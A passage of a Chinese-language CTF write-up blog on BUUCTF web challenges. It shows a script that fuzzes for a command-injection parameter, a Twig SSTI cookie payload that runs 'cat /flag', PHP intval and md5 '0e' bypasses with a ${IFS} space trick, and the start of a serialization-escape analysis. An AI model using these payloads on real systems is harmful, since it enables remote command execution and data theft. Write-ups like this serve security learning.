alt="image-20221020171427555" style="zoom:67%;" /><p>下载<code>www.tar.gz</code>后查看源码,发现变量名和文件名等等都被混淆过,完全没法读懂代码</p><p>简单看一下,搜索一下敏感函数,发现存在很多<code>eval</code>直接执行GET和POST参数的情况:</p><img src="/images/buuctf-web/image-20221020172010484-1667047819735127.png" alt="image-20221020172010484" style="zoom:67%;" /><p>那么很可能存在命令执行漏洞,现在需要找出哪个具体文件的具体参数会导致命令执行</p><p>把网站源码放在本地跑起来,便于测试:</p><img src="/images/buuctf-web/image-20221020172210664-1667047819735128.png" alt="image-20221020172210664" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">        file_content = f.read()</span><br><span class="line">        get_x = re.findall(r&quot;\$\_GET\[&#x27;(.*?)&#x27;\]&quot;, file_content)</span><br><span class="line">        post_x = re.findall(r&quot;\$\_POST\[&#x27;(.*?)&#x27;\]&quot;, file_content)</span><br><span class="line">        print(get_x)</span><br><span class="line">        print(post_x)</span><br><span class="line"></span><br><span class="line">[&#x27;XSDcSaffEbx6oZ&#x27;, &#x27;oz6Ej9P&#x27;, &#x27;az3R5f5s4&#x27;, &#x27;odtEQDItUT&#x27;, &#x27;NSgdqC&#x27;, &#x27;H4is8Z3LRoABM&#x27;, &#x27;ilv84RCQ&#x27;, &#x27;lww0c2Cx7y4TSRGi&#x27;, &#x27;Kwz6bXz2M&#x27;, &#x27;aNumqn2f&#x27;, &#x27;Fqb2uSrO8LMMB&#x27;, &#x27;jDT01_l&#x27;, &#x27;goch7KojU7T&#x27;, &#x27;qWm5RvJUt&#x27;, &#x27;qWm5RvJUt&#x27;, &#x27;BORTqm2Eo7A&#x27;, &#x27;nNSyzVRp1&#x27;, &#x27;nNSyzVRp1&#x27;, &#x27;fF8bAiWdOBLwZL9&#x27;, &#x27;frGFotiaH&#x27;, &#x27;hI7_X5i4R&#x27;, &#x27;hI7_X5i4R&#x27;, &#x27;FTxP0MHycmnFRtpz&#x27;, &#x27;Epwu9JxhOy&#x27;, &#x27;HyXW_N_4K2c&#x27;, &#x27;rdxi8mF&#x27;, &#x27;Ej3PC3fzf&#x27;, &#x27;JuB3q6twZW&#x27;, &#x27;yvBMQa0&#x27;, &#x27;iz6OwNzo3akf0&#x27;, &#x27;FR7mSIquukKmAHcB&#x27;, &#x27;x0ySdn&#x27;, &#x27;P1xbo5J6PutjgW&#x27;, &#x27;WJItkno6C&#x27;, &#x27;K3fy91AWDXdjly7&#x27;, &#x27;kI8X1sjYP&#x27;, &#x27;cbbhyBPGJ3omu&#x27;]</span><br><span class="line">[&#x27;c9tNeilUCYtuI_rW&#x27;, &#x27;GeSLNjbPhXFZTiU&#x27;, &#x27;zSBU5aRPV&#x27;, &#x27;EAwdIy7bl&#x27;, &#x27;bcWLBqVE&#x27;, &#x27;McfP0gwMy1Os&#x27;, &#x27;pIUHGWlCT_q&#x27;, &#x27;M5fIjgYMC1sybG3&#x27;, &#x27;KNzF8hev3&#x27;, &#x27;WGl60iQiCS&#x27;, &#x27;LdfrqXGQVtS&#x27;, &#x27;TETrtgSbwwSzl&#x27;, &#x27;nCXHgSWve&#x27;, &#x27;SzHhNCR76__IZY&#x27;, &#x27;rqVPmr&#x27;, &#x27;vuXMcABwIGPtivYT&#x27;, &#x27;VCXnjK4Qo5L2NKL&#x27;, &#x27;eoOoQHH1c&#x27;, &#x27;XystQX6Go_qu&#x27;, &#x27;fbcvPysDv&#x27;, &#x27;y4J9xESQbt_xvL8H&#x27;, &#x27;zRimyMWsH9ukp&#x27;, &#x27;axQvvHWB_1hdC&#x27;, &#x27;MfhwcPtHxG_GG4&#x27;, &#x27;zbVFQDcHKqZz9eR&#x27;, &#x27;K4w8M3WWbLtt_m4x&#x27;, &#x27;cZN6BUQ&#x27;, &#x27;qz9u5FQC5&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写一个脚本来测试出问题的是哪个文件中的哪个参数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">filelist = os.listdir(<span class="string">&quot;./src&quot;</span>)</span><br><span class="line">base_url = <span class="string">&quot;http://127.0.0.1:8090/src/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;echo &#x27;ffffllllaaaagggg&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> filelist:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./src/&quot;</span>+file, <span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = f.read()</span><br><span class="line">        get_x = re.findall(<span class="string">r&quot;\$\_GET\[&#x27;(.*?)&#x27;\]&quot;</span>, file_content)<span class="comment"># 正则匹配出当前文件中所有的get参数名</span></span><br><span class="line">        post_x = re.findall(<span class="string">r&quot;\$\_POST\[&#x27;(.*?)&#x27;\]&quot;</span>, file_content)<span class="comment"># 正则匹配出当前文件中所有的post参数名</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;now:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(file))</span><br><span class="line"></span><br><span class="line">        data = &#123;&#125;  <span class="comment"># 用来post的参数</span></span><br><span class="line">        params = &#123;&#125;  <span class="comment"># 用来get的参数</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> get_x:</span><br><span class="line">            params[i] = payload</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> post_x:</span><br><span class="line">            data[j] = payload</span><br><span class="line">        url = base_url+file</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        session0 = requests.session()</span><br><span class="line">        response = session0.post(url, data=data, params=params).text   <span class="comment"># 外层,测试可利用的是哪个文件</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ffffllllaaaagggg&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;this!!!!!!!!&#123;&#125;&quot;</span>.<span class="built_in">format</span>(file))   <span class="comment"># 内层,测试可利用的是这个文件里的哪个参数</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> param <span class="keyword">in</span> get_x:<span class="comment"># 测试get参数</span></span><br><span class="line">                session1 = requests.session()</span><br><span class="line">                params_per = &#123;param: payload&#125;</span><br><span class="line">                res = session1.get(url, params=params_per).text</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;ffffllllaaaagggg&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;this!!!!!!!&#123;&#125;&quot;</span>.<span class="built_in">format</span>(param))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> data <span class="keyword">in</span> post_x:<span class="comment"># 测试post参数</span></span><br><span class="line">                session2 = requests.session()</span><br><span class="line">                data_per = &#123;data: payload&#125;</span><br><span class="line">                res = session2.post(url, data=data_per).text</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;ffffllllaaaagggg&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;this!!!!!!!&#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020181021597.png" alt="image-20221020181021597" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this!!!!!!!!xk0SzyKwfzw.php</span><br><span class="line">this!!!!!!!Efa5BVG</span><br></pre></td></tr></table></figure><p>接下来直接借助这个参数执行命令就可以了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://33bb5a31-74a7-444e-8ffb-fd4095be3912.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=ls /</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020181610785-1667047819735129.png" alt="image-20221020181610785" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://33bb5a31-74a7-444e-8ffb-fd4095be3912.node4.buuoj.cn:81/xk0SzyKwfzw.php?Efa5BVG=cat /flag</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="Cookie-SSTI-Cookie-is-so-stable"><a href="#Cookie-SSTI-Cookie-is-so-stable" class="headerlink" title="[Cookie-SSTI]Cookie is so stable"></a>[Cookie-SSTI]Cookie is so stable</h1><p>进来之后<code>hint</code>中提示说看一下<code>cookies</code>,所以抓包看一下<code>cookie</code></p><p>经过抓包可以看出,在<code>Flag</code>页面输入的字符串会出现在回显页面上, 那么这题考的应该是<code>SSTI</code></p><img src="/images/buuctf-web/image-20221020212947194-1667047819735130.png" alt="image-20221020212947194" style="zoom:67%;" /><p>尝试判断一下网站的类型:</p><img src="/images/buuctf-web/1-1667047819735131.png" alt="image-20221016171017464" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=$&#123;7*7&#125;  没有运算,直接输出</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020210024205-1667047819735132.png" alt="image-20221020210024205" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=&#123;&#123;7*7&#125;&#125; 运算了</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020210112518-1667047819735133.png" alt="image-20221020210112518" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=&#123;&#123;7*&#x27;7&#x27;&#125;&#125; 运算了</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020210150775-1667047819735134.png" alt="image-20221020210150775" style="zoom:80%;" /><p>这样以来, 网站框架应该是<code>Twig(php)</code>或者<code>Jinja2(python)</code></p><p>直接找对应的payload过来尝试,目标是执行命令<code>cat /flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=312ddb9e8cfdca0837b4f7129796d1b3; user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020212707869.png" alt="image-20221020212707869" style="zoom:67%;" /><br><hr><br><h1 id="intvalr绕过-md5爆破-朴实无华"><a href="#intvalr绕过-md5爆破-朴实无华" class="headerlink" title="[intvalr绕过,md5爆破]朴实无华"></a>[intvalr绕过,md5爆破]朴实无华</h1><img src="/images/buuctf-web/image-20221020222547896.png" alt="image-20221020222547896" style="zoom:80%;" /><p>访问<code>robots.txt</code>:</p><img src="/images/buuctf-web/image-20221020222618709.png" alt="image-20221020222618709" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fAke_f1agggg.php</span><br></pre></td></tr></table></figure><p>访问一下这个文件:</p><img src="/images/buuctf-web/image-20221020222910649-1667047819736135.png" alt="image-20221020222910649" style="zoom:67%;" /><p>抓包又发现了一个文件:</p><img src="/images/buuctf-web/image-20221020223050808-1667047819736136.png" alt="image-20221020223050808" style="zoom:67%;" /><p>访问得到了源码: (做的时候汉字乱码了..直接网上找了一个..)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123; <span class="comment">// get_flag中不能有空格</span></span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>); <span class="comment">//将cat换成wctf2020</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>level1:</code> <code>intval</code>获取变量整数值</p><p>这里<code>if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)</code> 可以利用运算时进行转换的性质</p><p>例如传<code>123e12</code>, <code>intval($num)</code>时,取到字母就会停止,所以是123</p><p>但是在进行运算时,会把它整体强制转换成数值,<strong>这里的<code>e</code>会被当成科学计数法</strong>,所以<code>intval($num + 1) &gt; 2021</code>也成立</p><br><p><code>level2</code>中,首先需要一个<code>md5</code>计算后等于原值的值,这里利用</p><p><code>0e</code>开头的字符串在参与比较时,<strong>会被当做科学计数法</strong>,结果转换为0   这个性质</p><p>需要找一个以<code>0e</code>开头,且<code>md5</code>计算后仍为<code>0e</code>开头的字符串,且除了<code>0e</code>之外必须全是数字</p><p>这里只能用脚本碰撞了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib import md5</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    a = <span class="string">&#x27;0e&#x27;</span> + <span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    m = <span class="title function_ invoke__">md5</span>(a.<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">print</span>(i)</span><br><span class="line">    <span class="keyword">if</span> m[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> m[<span class="number">2</span>:].<span class="title function_ invoke__">isdigit</span>():</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;OK!!!!!!!!!1&#x27;</span>,a)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ed5aace2-3cdb-472b-9bd0-c403a02807ad.node4.buuoj.cn:81/fl4g.php?num=123e12&amp;md5=0e215962017&amp;get_flag=ls</span><br><span class="line">输出:</span><br><span class="line">404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fl4g.php?num=123e12&amp;md5=0e215962017&amp;get_flag=more$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221020230400979.png" alt="image-20221020230400979" style="zoom:80%;" /><br><hr><br><h1 id="长度减少的反序列化字符串逃逸-easy-serialize-php"><a href="#长度减少的反序列化字符串逃逸-easy-serialize-php" class="headerlink" title="[长度减少的反序列化字符串逃逸]easy_serialize_php"></a>[长度减少的反序列化字符串逃逸]easy_serialize_php</h1><p>进来点链接,有源码,url中用参数<code>f</code>传了一个调用的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?f=highlight_file</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>; <span class="comment">//将数组转化为字符串,并使用|分割,这里构造了一个正则匹配表达式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>); <span class="comment">//将匹配到的替换为空,这里只是替换的化可以双写绕过</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>); <span class="comment">//将数组(字典)中的每个元素解析为单独的变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>先分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SESSION中:</span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function  用户传进来的参数f, 这里应该是show_image</span><br><span class="line">$_SESSION[&#x27;img&#x27;] GET传一个img_path参数,先base64编码,再计算sha1</span><br></pre></td></tr></table></figure><p>给<code>function</code>传一下<code>phpinfo</code>,从<code>phpinfo</code>中得到提示,那么现在应该设法通过39行的<code> file_get_contents</code>来读取<code>d0g3_f1ag.php</code></p><img src="/images/buuctf-web/image-20221021090023073.png" alt="image-20221021090023073" style="zoom:80%;" /><p>上面代码中,28行自己传<code>img_path</code>的话,这个值不仅要被编码,还要再计算一次<code>sha1</code>,但是最后读文件的时候只会对其进行一次解码,完全对不上,所以这条路走不通.  那么就不要传<code>img_path</code>,让其执行26行的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br></pre></td></tr></table></figure><p><strong>注意到19行的<code>extract($_POST);</code> 这就使得我们通过<code>POST</code>传的参数可以覆盖前面已经定义好的参数</strong></p><p>本地模拟一下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 